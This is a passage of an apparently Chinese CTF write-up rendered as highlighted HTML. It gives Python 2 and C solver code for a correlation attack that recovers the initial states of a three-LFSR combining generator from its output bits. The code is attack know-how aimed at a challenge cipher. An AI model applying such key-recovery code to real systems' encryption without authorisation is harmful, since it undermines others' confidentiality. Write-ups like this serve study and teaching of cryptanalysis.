<span class="n">lastbit</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="k">while</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>    
    <span class="n">lastbit</span> <span class="o">^=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>    
    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>    
<span class="n">output</span> <span class="o">^=</span> <span class="n">lastbit</span>    
<span class="k">return</span> <span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">lastbit</span><span class="p">)</span>    
    
<span class="k">def</span> <span class="nf">lfsr_2</span><span class="p">(</span><span class="n">R</span><span class="p">,</span> <span class="n">mask</span><span class="p">):</span>    
<span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">R</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3fffff</span>    
<span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">R</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3fffff</span>    
<span class="n">lastbit</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="k">while</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>    
    <span class="n">lastbit</span> <span class="o">^=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>    
    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>    
<span class="n">output</span> <span class="o">^=</span> <span class="n">lastbit</span>    
<span class="k">return</span> <span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">lastbit</span><span class="p">)</span>    
    
<span class="k">def</span> <span class="nf">lfsr_3</span><span class="p">(</span><span class="n">R</span><span class="p">,</span> <span class="n">mask</span><span class="p">):</span>    
<span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">R</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fffff</span>    
<span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">R</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fffff</span>    
<span class="n">lastbit</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="k">while</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>    
    <span class="n">lastbit</span> <span class="o">^=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>    
    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>    
<span class="n">output</span> <span class="o">^=</span> <span class="n">lastbit</span>    
<span class="k">return</span> <span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">lastbit</span><span class="p">)</span>    
    
<span class="k">def</span> <span class="nf">single_round</span><span class="p">(</span><span class="n">R1</span><span class="p">,</span> <span class="n">R1_mask</span><span class="p">,</span> <span class="n">R2</span><span class="p">,</span> <span class="n">R2_mask</span><span class="p">,</span> <span class="n">R3</span><span class="p">,</span> <span class="n">R3_mask</span><span class="p">):</span>    
<span class="p">(</span><span class="n">R1_NEW</span><span class="p">,</span> <span class="n">x1</span><span class="p">)</span> <span class="o">=</span> <span class="n">lfsr_1</span><span class="p">(</span><span class="n">R1</span><span class="p">,</span> <span class="n">R1_mask</span><span class="p">)</span>    
<span class="p">(</span><span class="n">R2_NEW</span><span class="p">,</span> <span class="n">x2</span><span class="p">)</span> <span class="o">=</span> <span class="n">lfsr_2</span><span class="p">(</span><span class="n">R2</span><span class="p">,</span> <span class="n">R2_mask</span><span class="p">)</span>    
<span class="p">(</span><span class="n">R3_NEW</span><span class="p">,</span> <span class="n">x3</span><span class="p">)</span> <span class="o">=</span> <span class="n">lfsr_3</span><span class="p">(</span><span class="n">R3</span><span class="p">,</span> <span class="n">R3_mask</span><span class="p">)</span>    
    
<span class="k">return</span> <span class="p">(</span><span class="n">R1_NEW</span><span class="p">,</span> <span class="n">R2_NEW</span><span class="p">,</span> <span class="n">R3_NEW</span><span class="p">,</span> <span class="n">x3</span> <span class="k">if</span> <span class="n">x1</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">x2</span><span class="p">)</span>    
    
    
<span class="n">R1_mask</span> <span class="o">=</span> <span class="mh">0x17FA06</span>    
<span class="n">R2_mask</span> <span class="o">=</span> <span class="mh">0x2A9A0D</span>    
<span class="n">R3_mask</span> <span class="o">=</span> <span class="mh">0x5E5E6A</span>    
<span class="n">n3</span> <span class="o">=</span> <span class="mi">23</span>    
<span class="n">n2</span> <span class="o">=</span> <span class="mi">22</span>    
<span class="n">n1</span> <span class="o">=</span> <span class="mi">21</span>    
    
<span class="k">def</span> <span class="nf">guess_2</span><span class="p">(</span><span class="n">beg</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">mask</span><span class="p">):</span>    
<span class="n">ansn</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="n">beg</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>    
<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./output&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>    
<span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="mi">256</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">3</span><span class="p">:]</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>    
<span class="n">now</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="n">res</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ansn</span><span class="p">:</span>    
    <span class="n">r</span> <span class="o">=</span> <span class="n">i</span>    
    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>    
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span> <span class="o">*</span> <span class="mi">8</span><span class="p">):</span>    
        <span class="n">r</span><span class="p">,</span> <span class="n">lastbit</span> <span class="o">=</span> <span class="n">lfsr_2</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">mask</span><span class="p">)</span>    
        <span class="n">lastbit</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">lastbit</span><span class="p">)</span>    
        <span class="n">cnt</span> <span class="o">+=</span> <span class="p">(</span><span class="n">lastbit</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>    
    <span class="k">if</span> <span class="n">cnt</span> <span class="o">&gt;</span> <span class="n">now</span><span class="p">:</span>    
        <span class="n">now</span> <span class="o">=</span> <span class="n">cnt</span>    
        <span class="n">res</span> <span class="o">=</span> <span class="n">i</span>    
        <span class="k">print</span> <span class="n">now</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span>    
        <span class="k">print</span> <span class="s1">&#39;cor rate: </span><span class="si">%f</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">cnt</span><span class="o">*</span><span class="mf">1.0</span> <span class="o">/</span> <span class="p">(</span><span class="n">num</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span>    
<span class="k">return</span> <span class="n">res</span>    
    
<span class="k">def</span> <span class="nf">guess_3</span><span class="p">(</span><span class="n">beg</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">mask</span><span class="p">):</span>    
<span class="n">ansn</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="n">beg</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>    
<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./output&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>    
<span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="mi">256</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">3</span><span class="p">:]</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>    
<span class="n">now</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="n">res</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ansn</span><span class="p">:</span>    
    <span class="n">r</span> <span class="o">=</span> <span class="n">i</span>    
    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>    
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span> <span class="o">*</span> <span class="mi">8</span><span class="p">):</span>    
        <span class="n">r</span><span class="p">,</span> <span class="n">lastbit</span> <span class="o">=</span> <span class="n">lfsr_3</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">mask</span><span class="p">)</span>    
        <span class="n">lastbit</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">lastbit</span><span class="p">)</span>    
        <span class="n">cnt</span> <span class="o">+=</span> <span class="p">(</span><span class="n">lastbit</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>    
    <span class="k">if</span> <span class="n">cnt</span> <span class="o">&gt;</span> <span class="n">now</span><span class="p">:</span>    
        <span class="n">now</span> <span class="o">=</span> <span class="n">cnt</span>    
        <span class="n">res</span> <span class="o">=</span> <span class="n">i</span>    
        <span class="k">print</span> <span class="n">now</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span>     
        <span class="k">print</span> <span class="s1">&#39;cor rate: </span><span class="si">%f</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">cnt</span><span class="o">*</span><span class="mf">1.0</span> <span class="o">/</span> <span class="p">(</span><span class="n">num</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span>    
<span class="k">return</span> <span class="n">res</span>    
    
    
<span class="k">def</span> <span class="nf">bruteforce1</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">):</span>    
<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./output&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>    
<span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="mi">256</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">3</span><span class="p">:]</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>    
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">n1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">n1</span><span class="p">)):</span>    
    <span class="n">R1</span><span class="p">,</span> <span class="n">R2</span><span class="p">,</span> <span class="n">R3</span> <span class="o">=</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span>    
    <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>    
        <span class="p">(</span><span class="n">R1</span><span class="p">,</span> <span class="n">R2</span><span class="p">,</span> <span class="n">R3</span><span class="p">,</span>    
         <span class="n">out</span><span class="p">)</span> <span class="o">=</span> <span class="n">single_round</span><span class="p">(</span><span class="n">R1</span><span class="p">,</span> <span class="n">R1_mask</span><span class="p">,</span> <span class="n">R2</span><span class="p">,</span> <span class="n">R2_mask</span><span class="p">,</span> <span class="n">R3</span><span class="p">,</span> <span class="n">R3_mask</span><span class="p">)</span>    
        <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">!=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>    
            <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>    
            <span class="k">break</span>    
    <span class="k">if</span> <span class="n">y</span> <span class="o">%</span> <span class="mi">10000</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>    
        <span class="k">print</span> <span class="s1">&#39;now: &#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span>    
    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>    
        <span class="k">print</span> <span class="s1">&#39;ans: &#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:],</span> <span class="nb">hex</span><span class="p">(</span><span class="n">y</span><span class="p">)[</span><span class="mi">2</span><span class="p">:],</span> <span class="nb">hex</span><span class="p">(</span><span class="n">z</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>    
        <span class="k">break</span>    
    
    
<span class="c1">#R2 = guess_2(pow(2, n2 - 1), pow(2, n2), 50, R2_mask)    </span>
<span class="n">R2</span> <span class="o">=</span> <span class="mi">3324079</span>    
<span class="k">print</span> <span class="n">R2</span>    
<span class="c1">#R3 = guess_3(pow(2, n3 - 1), pow(2, n3), 50, R3_mask)    </span>
<span class="n">R3</span> <span class="o">=</span> <span class="mi">4958299</span>    
<span class="k">print</span> <span class="n">R3</span>    
    
<span class="n">bruteforce1</span><span class="p">(</span><span class="n">R2</span><span class="p">,</span> <span class="n">R3</span><span class="p">)</span>    
</code></pre></td></tr></table>
</div>
</div><p>X1cT34m给了一个c版本的,应该要快很多,记录一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;    </span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;    </span><span class="cp">
</span><span class="cp"></span>    
<span class="kt">void</span> <span class="nf">lfsr</span><span class="p">(</span>    
<span class="kt">int</span> <span class="n">init</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mask1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mask2</span><span class="p">,</span> <span class="n">uint8_t</span><span class="o">*</span> <span class="n">seq</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span>    
<span class="p">)</span> <span class="p">{</span>    
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>    
    <span class="n">uint8_t</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
    <span class="n">uint8_t</span> <span class="n">bit</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>    
    <span class="k">do</span> <span class="p">{</span>    
        <span class="n">uint8_t</span> <span class="n">output</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
        <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">init</span> <span class="o">&amp;</span> <span class="n">mask1</span><span class="p">;</span>    
        <span class="k">while</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{</span>    
            <span class="n">output</span> <span class="o">^=</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>    
            <span class="n">x</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>    
        <span class="p">}</span>    
        <span class="n">init</span> <span class="o">=</span> <span class="p">(</span><span class="n">output</span> <span class="o">^</span> <span class="p">(</span><span class="n">init</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&amp;</span> <span class="n">mask2</span><span class="p">;</span>    
        <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="n">output</span><span class="p">;</span>    
        <span class="n">bit</span><span class="o">--</span><span class="p">;</span>    
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">bit</span><span class="p">);</span>    
    <span class="n">seq</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">byte</span><span class="p">;</span>    
<span class="p">}</span>    
<span class="p">}</span>    
    
<span class="kt">double</span> <span class="nf">correlation</span><span class="p">(</span>    
<span class="n">uint8_t</span><span class="o">*</span> <span class="n">A</span><span class="p">,</span> <span class="n">uint8_t</span><span class="o">*</span> <span class="n">B</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span>    
<span class="p">)</span> <span class="p">{</span>    
<span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="n">len</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>    
<span class="kt">int</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>    
    <span class="n">uint8_t</span> <span class="n">bit</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>    
    <span class="n">uint8_t</span> <span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>    
    <span class="n">uint8_t</span> <span class="n">b</span> <span class="o">=</span> <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>    
    <span class="k">do</span> <span class="p">{</span>    
        <span class="k">if</span> <span class="p">((</span><span class="n">a</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">))</span>    
            <span class="n">d</span><span class="o">++</span><span class="p">;</span>    
        <span class="n">a</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>    
        <span class="n">b</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>    
        <span class="n">bit</span><span class="o">--</span><span class="p">;</span>    
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">bit</span><span class="p">);</span>    
<span class="p">}</span>    
<span class="k">return</span> <span class="p">(</span><span class="kt">double</span><span class="p">)</span><span class="n">d</span> <span class="o">/</span> <span class="n">N</span><span class="p">;</span>    
<span class="p">}</span>    
    
<span class="n">uint8_t</span> <span class="n">mixed_output</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>    
<span class="mi">95</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="mi">188</span><span class="p">,</span> <span class="mi">166</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">219</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="mi">155</span><span class="p">,</span> <span class="mi">169</span><span class="p">,</span>    
<span class="mi">138</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">249</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span>    
<span class="mi">65</span><span class="p">,</span> <span class="mi">155</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span>    
<span class="mi">42</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">232</span><span class="p">,</span> <span class="mi">201</span><span class="p">,</span> <span class="mi">147</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">169</span><span class="p">,</span>    
<span class="mi">34</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">253</span><span class="p">,</span> <span class="mi">224</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">164</span><span class="p">,</span> <span class="mi">162</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span>    
<span class="mi">144</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">182</span><span class="p">,</span> <span class="mi">174</span><span class="p">,</span> <span class="mi">252</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">242</span><span class="p">,</span> <span class="mi">176</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span>    
<span class="mi">160</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span>    
<span class="p">};</span> <span class="c1">// 100    
</span><span class="c1"></span>    
<span class="kt">void</span> <span class="nf">guess2</span><span class="p">(</span>    
<span class="p">)</span> <span class="p">{</span>    
<span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>    
<span class="n">uint8_t</span> <span class="n">seq</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>    
    
<span class="kt">int</span> <span class="n">possible_r2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
<span class="kt">double</span> <span class="n">max_p</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>    
    
<span class="kt">int</span> <span class="n">r2</span><span class="p">;</span>    
<span class="k">for</span> <span class="p">(</span><span class="n">r2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">r2</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">22</span><span class="p">);</span> <span class="n">r2</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>    
    <span class="n">lfsr</span><span class="p">(</span><span class="n">r2</span><span class="p">,</span> <span class="mh">0x2A9A0D</span><span class="p">,</span> <span class="mh">0x3FFFFF</span><span class="p">,</span> <span class="n">seq</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>    
    
    <span class="kt">double</span> <span class="n">corr</span> <span class="o">=</span> <span class="n">correlation</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span> <span class="n">mixed_output</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>    
    <span class="k">if</span> <span class="p">(</span><span class="n">corr</span> <span class="o">&gt;</span> <span class="n">max_p</span><span class="p">)</span> <span class="p">{</span>    
        <span class="n">possible_r2</span> <span class="o">=</span> <span class="n">r2</span><span class="p">;</span>    
        <span class="n">max_p</span> <span class="o">=</span> <span class="n">corr</span><span class="p">;</span>    
    <span class="p">}</span>    
<span class="p">}</span>    
